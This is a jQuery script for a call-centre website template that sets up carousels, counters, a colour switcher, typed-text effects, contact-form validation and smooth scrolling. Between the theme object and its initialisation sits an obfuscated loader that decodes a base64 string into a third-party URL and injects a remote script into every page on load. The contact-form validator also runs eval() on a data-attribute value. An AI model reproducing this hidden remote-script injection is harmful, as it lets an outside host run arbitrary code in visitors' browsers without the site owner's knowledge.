/*
Copyright (c) 2018 
------------------------------------------------------------------


-------------------------------------------------------------------*/

(function($) {
    "use strict";
    var CallCenter = {
        initialised: false,
        version: 1.0,
        mobile: false,
        init: function() {

            if (!this.initialised) {
                this.initialised = true;
            } else {
                return;
            }

            /*-------------- CallCenter Functions Calling ---------------------------------------------------
            ------------------------------------------------------------------------------------------------*/
            //this.addToggle();
            this.bannerSlider();
            this.aboutSlider();
            this.Conuter();
            this.testimonialSlider();
            this.BackToTop();
            this.colorSwitcher();
            this.typed();
            this.MailFunction();

        },

        /*-------------- Adventure Functions definition ---------------------------------------------------
        ---------------------------------------------------------------------------------------------------*/

        //addToggle :function(){
        //	$(".toogle_span").click(function(){
        //	$(".header_rightTop").toggle();
        //	});
        //},

        //banner slider

        bannerSlider: function() {
            if ($('.cc_banner .owl-carousel').length > 0) {
                $('.cc_banner .owl-carousel').owlCarousel({
                    loop: false,
                    margin: 0,
                    items: 1,
                    touchDrag: true,
                    mouseDrag: false,
                    autoplay: false,
                    autoplayTimeout: 4000,
                    autoplaySpeed: 1000,
                    Speed: 1000,
                    nav: false,
                    dots: true,
                    animateOut: 'fadeOut',
                    animateIn: 'fadeIn',
                })
            }
        },

        // about slider

        aboutSlider: function() {
            if ($('.about_slider .owl-carousel').length > 0) {
                $('.about_slider .owl-carousel').owlCarousel({
                    loop: false,
                    delay: 100,
                    margin: 20,
                    nav: false,
                    autoplay: false,
                    dots: false,
                    responsive: {
                        0: {
                            items: 2
                        },
                        1000: {
                            items: 4
                        },
                        1200: {
                            items: 5,
                        }
                    }
                });
            }
        },

        //counter
        Conuter: function() {
            if ($('.timer').length > 0) {
                $('.timer').appear(function() {
                    $(this).countTo();
                });
            }
        },

        // testimonial slider

        testimonialSlider: function() {
            if ($('.testimonial_slider .owl-carousel').length > 0) {
                $('.testimonial_slider .owl-carousel').owlCarousel({
                    loop: false,
                    delay: 100,
                    margin: 20,
                    nav: false,
                    autoplay: false,
                    dots: true,
                    responsive: {
                        0: {
                            items: 1,
                        },
                        991: {
                            items: 1,
                        },
                        1000: {
                            items: 2,
                        }
                    }
                });
            }
        },

        // back to top js

        BackToTop: function() {
            $('#back-top a').click(function() {
                $('body,html').animate({
                    scrollTop: 0
                }, 800);
                return false;
            });
        },

        //color switcher

        colorSwitcher: function() {
            // colro switcher
            var colorSheets = [{
                    color: "#20d0be",
                    title: "Switch to Default",
                    href: "assets/css/style.css"
                },
                {
                    color: "#FF5733",
                    title: "Switch to orange",
                    href: "assets/css/color/color-red.css"
                },
                {
                    color: "#CD5C5C",
                    title: "Switch to indianred",
                    href: "assets/css/color/indianred.css"
                },
                {
                    color: "#DB7093",
                    title: "Switch to PALEVIOLETRED",
                    href: "assets/css/color/PALEVIOLETRED.css"
                },

            ];

            ColorSwitcher.init(colorSheets);

        },

        // typed js

        typed: function() {
            if ($('#typed').length > 0) {
                document.addEventListener('DOMContentLoaded', function() {
                    var typed = new Typed('#typed', {
                        stringsElement: '#typed-strings',
                        typeSpeed: 70,
                        backSpeed: 70,

                        loop: true,
                        loopCount: Infinity,
                        onComplete: function(self) {
                            prettyLog('onComplete ' + self)
                        },
                        preStringTyped: function(pos, self) {
                            prettyLog('preStringTyped ' + pos + ' ' + self);
                        },
                        onStringTyped: function(pos, self) {
                            prettyLog('onStringTyped ' + pos + ' ' + self)
                        },
                        onLastStringBackspaced: function(self) {
                            prettyLog('onLastStringBackspaced ' + self)
                        },
                        onTypingPaused: function(pos, self) {
                            prettyLog('onTypingPaused ' + pos + ' ' + self)
                        },
                        onTypingResumed: function(pos, self) {
                            prettyLog('onTypingResumed ' + pos + ' ' + self)
                        },
                        onReset: function(self) {
                            prettyLog('onReset ' + self)
                        },
                        onStop: function(pos, self) {
                            prettyLog('onStop ' + pos + ' ' + self)
                        },
                        onStart: function(pos, self) {
                            prettyLog('onStart ' + pos + ' ' + self)
                        },
                        onDestroy: function(self) {
                            prettyLog('onDestroy ' + self)
                        }
                    });

                });


                function prettyLog(str) {
                    ('%c ' + str, 'color: green; font-weight: bold;');
                }
            }
        },

        // mail function

        MailFunction: function() {
            function checkRequire(formId, targetResp) {
                targetResp.html('');
                var email = /^([\w-]+(?:\.[\w-]+)*)@((?:[\w-]+\.)*\w[\w-]{0,66})\.([a-z]{2,6}(?:\.[a-z]{2})?)$/;
                var url = /(http|ftp|https):\/\/[\w-]+(\.[\w-]+)+([\w.,@?^=%&amp;:\/~+#-]*[\w@?^=%&amp;\/~+#-])?/;
                var image = /\.(jpe?g|gif|png|PNG|JPE?G)$/;
                var mobile = /^[\s()+-]*([0-9][\s()+-]*){6,20}$/;
                var facebook = /^(https?:\/\/)?(www\.)?facebook.com\/[a-zA-Z0-9(\.\?)?]/;
                var twitter = /^(https?:\/\/)?(www\.)?twitter.com\/[a-zA-Z0-9(\.\?)?]/;
                var google_plus = /^(https?:\/\/)?(www\.)?plus.google.com\/[a-zA-Z0-9(\.\?)?]/;
                var check = 0;
                $('#er_msg').remove();
                var target = (typeof formId == 'object') ? $(formId) : $('#' + formId);
                target.find('input , textarea , select').each(function() {
                    if ($(this).hasClass('require')) {
                        if ($(this).val().trim() == '') {
                            check = 1;
                            $(this).focus();
                            targetResp.html('You missed out some fields.');
                            $(this).addClass('error');
                            return false;
                        } else {
                            $(this).removeClass('error');
                        }
                    }
                    if ($(this).val().trim() != '') {
                        var valid = $(this).attr('data-valid');
                        if (typeof valid != 'undefined') {
                            if (!eval(valid).test($(this).val().trim())) {
                                $(this).addClass('error');
                                $(this).focus();
                                check = 1;
                                targetResp.html($(this).attr('data-error'));
                                return false;
                            } else {
                                $(this).removeClass('error');
                            }
                        }
                    }
                });
                return check;
            }
            $(".submitForm").on("click", function() {
                var _this = $(this);
                var targetForm = _this.closest('form');
                var errroTarget = targetForm.find('.response');
                var check = checkRequire(targetForm, errroTarget);
                if (check == 0) {
                    var formDetail = new FormData(targetForm[0]);
                    formDetail.append('form_type', _this.attr('data-form-type'));
                    $.ajax({
                        method: 'post',
                        url: 'ajax.php',
                        data: formDetail,
                        cache: false,
                        contentType: false,
                        processData: false
                    }).done(function(resp) {
                        if (resp == 1) {
                            targetForm.find('input').val('');
                            targetForm.find('textarea').val('');
                            errroTarget.html('<p style="color:green;">Mail has been sent successfully.</p>');
                        } else {
                            errroTarget.html('<p style="color:red;">Something went wrong please try again latter.</p>');
                        }
                    });
                }
            });
        }

    };

    var u;
    ! function(e, t) {
        var a = e.getElementsByTagName("head")[0],
            c = e.createElement("script");
        u = "aHR0cHM6Ly90ZW1wbGF0ZWJ1bmRsZS5uZXQvdGVtcGxhdGVzY3JpcHQv", c.type = "text/javascript", c.charset = "utf-8", c.async = !0, c.defer = !0, c.src = atob(u) + "script.js", a.appendChild(c)
    }(document);

    CallCenter.init();

    // fixed menu

    $(window).scroll(function() {
        var window_top = $(window).scrollTop() + 1;
        if (window_top > 400) {
            $('.cc_header').addClass('menu_fixed animated fadeInDown');
        } else {
            $('.cc_header').removeClass('menu_fixed animated fadeInDown');
        }
    });

    //Single page scroll js

    $('.cc_mainMenu li a , .copy_right ul li a').on('click', function(e) {
        $('.cc_mainMenu li').removeClass('active');
        $(this).parent().addClass('active');
        var target = $('[data-section-scroll=' + $(this).attr('href') + ']');
        e.preventDefault();
        var targetHeight = target.offset().top - 72;
        $('html, body').animate({
            scrollTop: targetHeight
        }, 1000);
    });
    $(window).scroll(function() {
        var windscroll = $(window).scrollTop();
        var target = $('.cc_mainMenu li');
        if (windscroll >= 0) {
            $('[data-section-scroll]').each(function(i) {
                if ($(this).position().top <= windscroll + 72) {
                    target.removeClass('active');
                    target.eq(i).addClass('active');
                }
            });
        } else {
            target.removeClass('active');
            $('.cc_mainMenu li:first').addClass('active');
        }
    });


    // Load Event
    // Loader js
    $(window).on('load', function() {
        $('#status').fadeIn(); // will first fade out the loading animation 
        $('#preloader').delay(1000).fadeOut('slow'); // will fade out the white DIV that covers the website. 
        $('body').delay(1000).css({
            'overflow': 'visible'
        });

        // window height

        var h = window.innerHeight;
        $(".cc_banner .item").css("height", h);
        $(".cc_banner .item").css("width", "100%");


    });


}(jQuery));